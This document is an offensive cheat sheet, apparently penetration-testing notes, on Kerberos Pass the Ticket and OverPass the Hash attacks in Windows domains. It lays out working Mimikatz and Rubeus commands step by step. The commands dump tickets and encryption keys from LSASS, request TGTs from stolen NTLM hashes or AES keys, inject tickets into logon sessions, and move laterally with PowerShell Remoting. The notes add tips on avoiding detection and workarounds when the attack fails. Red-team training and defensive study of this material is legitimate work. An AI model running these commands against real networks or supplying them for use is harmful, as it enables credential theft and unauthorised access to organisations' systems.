# Pass the Ticket (PtT) from Windows

**Pass the Ticket (PtT)** is a lateral movement technique where an attacker uses a **stolen Kerberos ticket** instead of an NTLM password hash to authenticate to remote services. This is possible because Kerberos is a ticket-based system; once a user has a valid **Ticket Granting Ticket (TGT)** or **Service Ticket (TGS)**, they do not need to provide a password for subsequent requests within the ticket's validity period.

### 1. Harvesting Kerberos Tickets

To perform PtT, you must first obtain a valid ticket from the system's memory. On Windows, tickets are processed and stored by the **LSASS** process.

**Scenario Context:** Use when you have gained local administrative privileges on a workstation and want to collect tickets from all active sessions to move to other machines.

|Tool|Command|Description|
|:--|:--|:--|
|**Mimikatz**|`sekurlsa::tickets /export`|Exports all available tickets from LSASS to disk as `.kirbi` files.|
|**Rubeus**|`Rubeus.exe dump /nowrap`|Dumps all tickets in **Base64** format directly to the console for easier copy-pasting.|

**Operational Steps:**

1. **Gain Administrative Access:** Local administrator rights are required to collect tickets from all users; non-admins can only harvest their own tickets.
2. **Execute Export:** Run the chosen tool to extract tickets from memory.
3. **Identify Target Tickets:**
    - Files ending in `$` belong to **computer accounts**.
    - Files containing `krbtgt` represent the **TGT** of that account.
    - User tickets follow the format `[random]-<USERNAME>@<SERVICE>-<DOMAIN>.kirbi`.

---

### 2. Pass the Key (OverPass the Hash)

This technique converts a user's **NTLM hash** or **Kerberos key** (AES-256/RC4) into a full **Ticket Granting Ticket (TGT)**.

**Scenario Context:** Use when you have a user's hash but want to interact with Kerberos-only services or avoid NTLM-based detection.

| Tool         | Command                                                                     | Parameter                                                               |     |
| :----------- | :-------------------------------------------------------------------------- | :---------------------------------------------------------------------- | --- |
| **Mimikatz** | `sekurlsa::ekeys`                                                           | Enumerates all Kerberos encryption keys for all users in memory.        |     |
| **Mimikatz** | `sekurlsa::pth /domain:<DOMAIN> /user:<USERNAME> /ntlm:<HASH>`              | Performs PtH/PtK and launches a new `cmd.exe` in the target context.    |     |
| **Rubeus**   | `Rubeus.exe asktgt /domain:<DOMAIN> /user:<USERNAME> /aes256:<KEY> /nowrap` | Requests a TGT using the provided AES-256 key and outputs it in Base64. |     |

**Attack Implications:**

- **Bypasses NTLM:** Allows movement in environments where NTLM might be restricted or heavily monitored.
- **Detection Risk:** Modern domains (functional level 2008+) use **AES encryption** by default; using an **RC4_HMAC (NTLM)** hash in a Kerberos exchange may trigger "encryption downgrade" alerts.

---

### 3. Executing Pass the Ticket (PtT)

Once a ticket is harvested or forged, it must be imported into the current session to access remote resources.

#### Using Rubeus (Session Import)

Rubeus can import tickets directly into the current logon session without needing administrative rights.

**A. Import via /ptt Flag (Automated):** Use when requesting a TGT to immediately apply it to your session.

```
Rubeus.exe asktgt /domain:<DOMAIN> /user:<USERNAME> /rc4:<HASH> /ptt
```

**B. Import from Disk (.kirbi):** Use when you have previously harvested `.kirbi` files.

```
Rubeus.exe ptt /ticket:<TICKET_FILE>.kirbi
```

**C. Import from Base64:** Use when you have a Base64 string from a previous Rubeus dump.

```
Rubeus.exe ptt /ticket:<BASE64_STRING>
```

#### Using Mimikatz

Mimikatz requires administrative rights to perform PtT/PtK.

**Import from Disk:**

```
mimikatz.exe "privilege::debug" "kerberos::ptt <PATH_TO_TICKET>.kirbi" "exit"
```

---

### 4. Lateral Movement via PowerShell Remoting

After importing a ticket, you can use **PowerShell Remoting (WinRM)** to execute commands on a remote target.

**Scenario Context:** Use when the target user is a member of the **Remote Management Users** group or is a local administrator on the target machine.

**Operational Workflow:**

1. **Create Sacrificial Process (Rubeus):** Use `createnetonly` to create a hidden process. This prevents the imported ticket from overwriting your existing TGT in your primary session.
    
    ```
    Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
    ```
    
2. **Import Ticket in New Window:** Inside the new `cmd.exe` window, request or import the ticket using the `/ptt` flag.
    
    ```
    Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<KEY> /ptt
    ```
    
3. **Connect to Target:** Launch PowerShell from that same window and connect to the remote host.
    
    ```
    powershell
    Enter-PSSession -ComputerName <TARGET_IP_OR_HOSTNAME>
    ```
    

---

### Failure Conditions and Edge Cases

|Condition|Impact|Note|
|:--|:--|:--|
|**Mimikatz Version 2.2.0**|Encryption Failure|In some Win10 versions, `sekurlsa::ekeys` may incorrectly display hashes as `des_cbc_md4`, causing exported tickets to fail. Use Rubeus as a workaround.|
|**Non-Admin Rights**|Limited Harvesting|Without local admin, you can only export your own Kerberos tickets from LSASS.|
|**WinRM Not Enabled**|Connection Failure|PowerShell Remoting requires listeners on TCP/5985 (HTTP) or TCP/5986 (HTTPS) to be active on the target.|